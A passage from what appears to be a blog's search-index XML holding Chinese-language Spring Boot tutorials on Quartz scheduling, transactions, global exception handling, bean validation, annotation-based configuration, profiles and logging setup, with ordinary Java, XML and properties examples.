class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，bean对象均需实现序列化接口用于存储对象</p><br/><h2 id="定时调度Quartz集成"><a href="#定时调度Quartz集成" class="headerlink" title="定时调度Quartz集成"></a>定时调度Quartz集成</h2><p>配置依赖项</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Quartz --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-quartz<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定义定时任务类，实现<code>Job</code>接口，在<code>execute()</code>方法中实现任务逻辑</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFirstJob</span> <span class="keyword">implements</span> <span class="title class_">Job</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(MyFirstJob.class);</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(JobExecutionContext context)</span> <span class="keyword">throws</span> JobExecutionException &#123;</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        log.info(sdf.format(<span class="keyword">new</span> <span class="title class_">Date</span>()) + <span class="string">&quot;--&gt;&quot;</span> + <span class="string">&quot;Hello Spring Boot Quartz...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建配置类，实例化<code>JobDetail</code>并定义<code>Trigger</code>注册到<code>scheduler</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuartzConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> JobDetail <span class="title function_">jobDetail1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JobBuilder.newJob(MyFirstJob.class).storeDurably().build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Trigger <span class="title function_">trigger1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">SimpleScheduleBuilder</span> <span class="variable">scheduleBuilder</span> <span class="operator">=</span> SimpleScheduleBuilder.simpleSchedule()</span><br><span class="line">                .withIntervalInSeconds(<span class="number">1</span>)</span><br><span class="line">                .repeatForever();</span><br><span class="line">        <span class="keyword">return</span> TriggerBuilder.newTrigger()</span><br><span class="line">                .withIdentity(<span class="string">&quot;trigger1&quot;</span>, <span class="string">&quot;group1&quot;</span>)</span><br><span class="line">                .withSchedule(scheduleBuilder)</span><br><span class="line">                .forJob(jobDetail1())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="事务控制与全局异常"><a href="#事务控制与全局异常" class="headerlink" title="事务控制与全局异常"></a>事务控制与全局异常</h2><h3 id="事务控制"><a href="#事务控制" class="headerlink" title="事务控制"></a>事务控制</h3><p>使用<code>@Transactional</code>注解进行事务控制，在遇到异常时进行回滚，确保数据同步</p><h3 id="全局异常"><a href="#全局异常" class="headerlink" title="全局异常"></a>全局异常</h3><p>SpringMVC 中对异常统一处理提供了相应的方式，推荐使用实现 <code>HandlerExceptionResolver</code> 接口的方式，对代码侵入性较小</p><p><strong><code>@ControllerAdvice</code>注解</strong></p><p>该注解组合了 <code>@Component</code> 注解功能，最常用的就是作为全局异常处理的切面类。同时通过该注解可以指定包扫描的范围。<code>@ControllerAdvice</code> 约定了几种可行的返回值，如果是直接返回 model 类的话，需要使用 <code>@ResponseBody</code> 进行 JSON 转换</p><p><strong><code>@ExceptionHandler</code>注解</strong></p><p>该注解在 Spring 3.X 版本引入，在处理异常时标注在方法级别，代表当前方法处理的异常类型有哪些。具体应用以 Restful 接口为例，测试保存用户接口</p><p><strong>定义全局异常处理类</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@ExceptionHandler(value = Exception.class)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResultInfo <span class="title function_">exceptionHandler</span><span class="params">(Exception e)</span> &#123;</span><br><span class="line">        <span class="type">ResultInfo</span> <span class="variable">resultInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResultInfo</span>();</span><br><span class="line">        resultInfo.setCode(<span class="number">300</span>);</span><br><span class="line">        resultInfo.setMsg(<span class="string">&quot;操作失败!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(e <span class="keyword">instanceof</span> ParamsException) &#123;</span><br><span class="line">            <span class="type">ParamsException</span> <span class="variable">pe</span> <span class="operator">=</span> (ParamsException) e;</span><br><span class="line">            resultInfo.setMsg(pe.getMsg());</span><br><span class="line">            resultInfo.setCode(pe.getCode());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> resultInfo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="数据校验Validation集成"><a href="#数据校验Validation集成" class="headerlink" title="数据校验Validation集成"></a>数据校验Validation集成</h2><p>在日常项目开发中，对于前端提交的表单，后台接口接收到表单数据后，为了程序的严谨性，通常后端会加入业务参数的合法校验操作来避免程序的非技术性 bug。这里对于客户端提交的数据校验，Spring Boot 通过 <code>spring-boot-starter-validation</code> 模块包含了数据校验的工作</p><p><strong>JSR303</strong>：JSR303 是一项标准，只提供规范不提供实现，规定一些校验规范即校验注解，如 <code>@Null</code>、<code>@NotNull</code>、<code>@Pattern</code>，位于 <code>javax.validation.constraints</code> 包下。JSR-349 是其升级版本，添加了一些新特性</p><p><strong>Hibernate Validation</strong>：Hibernate Validation 是对这个规范的实现，并增加了一些其他校验注解，如 <code>@Email</code>、<code>@Length</code>、<code>@Range</code> 等等</p><p><strong>Spring Validation</strong>：Spring Validation 对 Hibernate Validation 进行了二次封装，在 Spring MVC 模块中添加了自动校验，并将校验信息封装进了特定的类中</p><h3 id="相关注解-1"><a href="#相关注解-1" class="headerlink" title="相关注解"></a>相关注解</h3><table><thead><tr><th align="left">注解</th><th align="left">功能描述</th></tr></thead><tbody><tr><td align="left"><strong>@AssertFalse</strong></td><td align="left">可以为 null，如果不为 null 则必须为 false</td></tr><tr><td align="left"><strong>@AssertTrue</strong></td><td align="left">可以为 null，如果不为 null 则必须为 true</td></tr><tr><td align="left"><strong>@DecimalMax</strong></td><td align="left">设置不能超过的最大值</td></tr><tr><td align="left"><strong>@DecimalMin</strong></td><td align="left">设置不能小于的最小值</td></tr><tr><td align="left"><strong>@Digits</strong></td><td align="left">必须是数字，且整数部分和小数部分的位数在指定范围内</td></tr><tr><td align="left"><strong>@Future</strong></td><td align="left">日期必须在当前日期的未来</td></tr><tr><td align="left"><strong>@Past</strong></td><td align="left">日期必须在当前日期的过去</td></tr><tr><td align="left"><strong>@Max</strong></td><td align="left">值不得超过指定的最大值</td></tr><tr><td align="left"><strong>@Min</strong></td><td align="left">值不得小于指定的最小值</td></tr><tr><td align="left"><strong>@NotNull</strong></td><td align="left">不能为 null（但可以是空字符串、空集合等）</td></tr><tr><td align="left"><strong>@Pattern</strong></td><td align="left">必须满足指定的正则表达式</td></tr><tr><td align="left"><strong>@Size</strong></td><td align="left">集合、数组、Map 等的 size() 值必须在指定范围内</td></tr><tr><td align="left"><strong>@Email</strong></td><td align="left">必须是合法的电子邮件格式</td></tr><tr><td align="left"><strong>@Length</strong></td><td align="left">字符串长度必须在指定范围内</td></tr><tr><td align="left"><strong>@NotBlank</strong></td><td align="left">字符串不能为 null，且 trim() 后不能等于空字符串</td></tr><tr><td align="left"><strong>@NotEmpty</strong></td><td align="left">不能为 null，集合、数组、Map 等 size() 不能为 0；字符串 trim() 后可以等于空字符串</td></tr><tr><td align="left"><strong>@Range</strong></td><td align="left">值必须在指定的范围内</td></tr><tr><td align="left"><strong>@URL</strong></td><td align="left">必须是一个合法的 URL</td></tr></tbody></table><p>对字段属性值进行校验</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;用户名不能为空!&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;用户密码不能为空!&quot;)</span></span><br><span class="line">    <span class="meta">@Length(min = 6, max = 10, message = &quot;密码长度至少6位但不超过10位!&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String userPwd;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Email</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对接口方法的形参进行校验</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;user&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;用户添加&quot;)</span></span><br><span class="line"><span class="meta">@ApiImplicitParam(name = &quot;user&quot;, value = &quot;用户实体类&quot;, dataType = &quot;User&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResultInfo <span class="title function_">saveUser</span><span class="params">(<span class="meta">@Valid</span> User user)</span> &#123;</span><br><span class="line">    <span class="type">ResultInfo</span> <span class="variable">resultInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResultInfo</span>();</span><br><span class="line">    <span class="keyword">return</span> resultInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不满足数据校验的情况会抛出<code>Bind Exception</code>异常，可以结合全局异常对其进行处理</p><br/>]]></content>
      
      
      <categories>
          
          <category> 简易开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot第一部分</title>
      <link href="/2025/12/31/SpringBoot%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/"/>
      <url>/2025/12/31/SpringBoot%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringBoot第一部分"><a href="#SpringBoot第一部分" class="headerlink" title="SpringBoot第一部分"></a>SpringBoot第一部分</h1><p>Spring Boot 是一个基于 Spring 框架的开箱即用项目，通过自动配置和约定优于配置的原则极大简化了项目的初始搭建与开发部署流程。它内置了 Tomcat、Jetty 等 Web 服务器，可直接打包为可独立运行的 JAR 文件，无需依赖外部容器</p><br/><h2 id="注解配置"><a href="#注解配置" class="headerlink" title="注解配置"></a>注解配置</h2><p>以下注解可用于配置和获取bean，用以取代XML配置文件</p><table><thead><tr><th align="left">注解</th><th align="left">作用位置</th><th align="left">功能描述</th></tr></thead><tbody><tr><td align="left"><code>@Configuration</code></td><td align="left">类</td><td align="left">声明当前类为配置类，相当于 XML 配置文件</td></tr><tr><td align="left"><code>@ComponentScan</code></td><td align="left">类</td><td align="left">自动扫描指定包下带有 <code>@Repository</code>、<code>@Service</code>、<code>@Controller</code>、<code>@Component</code> 的类，并由 IoC 容器进行实例化和维护</td></tr><tr><td align="left"><code>@Component</code></td><td align="left">类</td><td align="left">通用注解，声明该类为 Spring 组件，由 IoC 容器管理</td></tr><tr><td align="left"><code>@Bean</code></td><td align="left">方法</td><td align="left">声明当前方法的返回值为一个 Bean，相当于 XML 中的 <code>&lt;bean&gt;</code> 标签</td></tr><tr><td align="left"><code>@Value</code></td><td align="left">字段、方法参数</td><td align="left">用于从 properties 文件中获取指定 key 对应的 value 值</td></tr></tbody></table><h3 id="Bean注解使用"><a href="#Bean注解使用" class="headerlink" title="@Bean注解使用"></a><code>@Bean</code>注解使用</h3><p>在配置类中实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.example.springboot&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IocConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> AccountDao <span class="title function_">accountDao</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AccountDao</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取实例</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Starter02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(IocConfig.class);</span><br><span class="line">        <span class="type">IocConfig</span> <span class="variable">iocConfig</span> <span class="operator">=</span> ac.getBean(IocConfig.class);</span><br><span class="line">        <span class="type">AccountDao</span> <span class="variable">accountDao</span> <span class="operator">=</span> iocConfig.accountDao();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Value注解使用"><a href="#Value注解使用" class="headerlink" title="@Value注解使用"></a><code>@Value</code>注解使用</h3><p>准备配置文件，如<code>user.properties</code></p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">user.userName</span> = <span class="string">admin</span></span><br><span class="line"><span class="attr">user.</span> <span class="string">userPasswd = admin</span></span><br></pre></td></tr></table></figure><p>配置类通过<code>@PropertySource</code>注解加载配置文件，<code>@Value</code>用于获取值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.example.springboot&quot;)</span></span><br><span class="line"><span class="meta">@PropertySource(value = &quot;classpath:user.properties&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IocConfig</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;user.userPasswd&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String adminPasswd;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在配置类中加载后，其他bean对象都可以获得载入的配置文件属性</p><h3 id="元注解与组合注解"><a href="#元注解与组合注解" class="headerlink" title="元注解与组合注解"></a>元注解与组合注解</h3><p>元注解可以标记在注解上组成组合注解，组合注解具有元注解的原始功能，我们也可以自定义组合注解。自定义的组合注解一般具有<code>@Target</code>、<code>@Retention</code>、<code>@Documented</code>三个元注解，分别表示该注解作用的对象、保留时机和注解信息是否存在于JavaDoc中</p><p>自定义组合注解</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> NewCompScan &#123;</span><br><span class="line">    String[] value() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="SpringMVC的注解配置"><a href="#SpringMVC的注解配置" class="headerlink" title="SpringMVC的注解配置"></a>SpringMVC的注解配置</h2><p> 编写配置类取代XML配置文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">// 在@Configuration注解的配置类中添加，用于为该应用添加SpringMVC的功能</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.xxxx.springboot&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MVCConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> InternalResourceViewResolver <span class="title function_">viewResolver</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">InternalResourceViewResolver</span> <span class="variable">viewResolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InternalResourceViewResolver</span>();</span><br><span class="line">        viewResolver.setPrefix(<span class="string">&quot;/WEB-INF/views/&quot;</span>);</span><br><span class="line">        viewResolver.setSuffix(<span class="string">&quot;.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> viewResolver;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>WebApplicationInitializer</code>接口的实现类实现配置类的功能，实现该接口的类都能在web应用启动时被加载</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebInitializer</span> <span class="keyword">implements</span> <span class="title class_">WebApplicationInitializer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStartup</span><span class="params">(ServletContext servletContext)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="type">AnnotationConfigWebApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigWebApplicationContext</span>();</span><br><span class="line">        ctx.register(MVCConfig.class);</span><br><span class="line">        ctx.setServletContext(servletContext);</span><br><span class="line">        ServletRegistration.<span class="type">Dynamic</span> <span class="variable">servlet</span> <span class="operator">=</span> servletContext.addServlet(<span class="string">&quot;dispatcher&quot;</span>, <span class="keyword">new</span> <span class="title class_">DispatcherServlet</span>(ctx));</span><br><span class="line">        servlet.addMapping(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        servlet.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于配置拦截器，需要<code>MVCConfig</code>配置类实现 <code>WebMvcConfigurer</code>接口，<code>loginInterceptor</code>为我们定义的拦截器类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MVCConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> LoginInterceptor <span class="title function_">loginInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LoginInterceptor</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(loginInterceptor())</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/login&quot;</span>, <span class="string">&quot;/css/**&quot;</span>, <span class="string">&quot;/js/**&quot;</span>, <span class="string">&quot;/images/**&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="SpringBoot程序编写"><a href="#SpringBoot程序编写" class="headerlink" title="SpringBoot程序编写"></a>SpringBoot程序编写</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>配置依赖项，SpringBoot项目必须要将<code>&lt;parent&gt;</code>标签设置为SpringBoot的parent，该parent包含了大量默认配置，帮助开发者自动选择依赖版本，简化了开发程序</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置插件，用于方便打包环节</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="编写源码"><a href="#编写源码" class="headerlink" title="编写源码"></a>编写源码</h3><p>编写Controller类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(&quot;hello&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello SpringBoot&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建启动程序</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Starter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Starter.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动<code>main</code>方法，就可以默认运行在8080端口下</p><br/><h2 id="SpringBoot自定义配置"><a href="#SpringBoot自定义配置" class="headerlink" title="SpringBoot自定义配置"></a>SpringBoot自定义配置</h2><h3 id="Banner图标"><a href="#Banner图标" class="headerlink" title="Banner图标"></a>Banner图标</h3><p>SpringBoot启动的默认Banner图标</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">  .   ____          _            __ _ _</span><br><span class="line"> /\\ / ___&#x27;_ __ _ _(_)_ __  __ _ \ \ \ \</span><br><span class="line">( ( )\___ | &#x27;_ | &#x27;_| | &#x27;_ \/ _` | \ \ \ \</span><br><span class="line"> \\/  ___)| |_)| | | | | || (_| |  ) ) ) )</span><br><span class="line">  &#x27;  |____| .__|_| |_|_| |_\__, | / / / /</span><br><span class="line"> =========|_|==============|___/=/_/_/_/</span><br><span class="line"> :: Spring Boot ::               (v2.7.18)</span><br></pre></td></tr></table></figure><p>我们可以在<code>src/main/resources</code>目录下新建<code>banner.txt</code>文件，这样程序启动时会加载我们自定义的图标文件</p><h3 id="SpringBoot配置文件"><a href="#SpringBoot配置文件" class="headerlink" title="SpringBoot配置文件"></a>SpringBoot配置文件</h3><p>Spring Boot 默认会读取全局配置文件，配置文件名固定为：<code>application.properties</code> 或 <code>application.yml</code>，放置在 <code>src/main/resources</code> 资源目录下，使用配置文件来修改 SpringBoot 自动配置的默认值</p><p>在 resources 资源目录下添加 <code>application.properties</code> 文件，配置信息如下：</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">### 项目启动端口号配置</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8080</span></span><br><span class="line"><span class="comment">### 项目访问上下文路径</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/mvc</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">### 数据源配置</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:mysql://127.0.0.1:3306/DBName?useUnicode=true&amp;characterEncoding=utf8</span></span><br><span class="line"><span class="attr">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">spring.datasource.password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure><h3 id="Peofile配置"><a href="#Peofile配置" class="headerlink" title="Peofile配置"></a>Peofile配置</h3><p>Profile 是 Spring 用来针对不同环境对不同配置提供支持的全局 Profile 配置使用 <code>application-{profile}.yml</code>，比如 <code>application-dev.yml</code>，<code>application-test.yml</code></p><p>通过在 <code>application.yml</code> 中设置 <code>spring.profiles.active=test|dev|prod</code> 来动态切换不同环境，具体配置如下：</p><p><code>application-dev.yml</code> 开发环境配置文件</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8989</span></span><br></pre></td></tr></table></figure><p><code>application-test.yml</code> 测试环境配置文件</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><code>application.yml</code> 主配置文件，使用<code>active</code>属性切换环境</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br></pre></td></tr></table></figure><h3 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h3><p>Spring Boot 默认使用 LogBack 日志系统，如果不需要更改为其他日志系统如 Log4j2 等，则无需多余的配置，LogBack 默认将日志打印到控制台上。如果要使用 Log4j2，原则上是需要添加 dependency 依赖的</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Spring Boot Web Starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 排除默认的 Logback --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!-- 添加 Log4j2 Starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span 